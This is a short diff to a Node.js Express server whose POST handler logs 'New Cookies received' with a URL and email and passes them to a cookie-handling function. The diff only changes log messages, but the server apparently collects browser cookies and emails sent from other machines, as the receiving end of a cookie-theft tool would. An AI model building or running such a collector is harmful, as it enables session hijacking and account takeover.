@@ -18,12 +18,12 @@ app.get("/", async (req, res) => {
 });
 
 app.post("/", (req, res) => {
-    console.log("New Cookies recieved!", req.body.url);
+    console.log("\nNew Cookies received: ", req.body.url, req.body.email);
     utils.handleCookies(req.body);
     res.json("Data recieved successfully!");
 
 });
 
 app.listen(PORT, () => {
-    console.log(`Server is running on port ${PORT}`);
+    console.log(`\nServer is running on port ${PORT}`);
 });
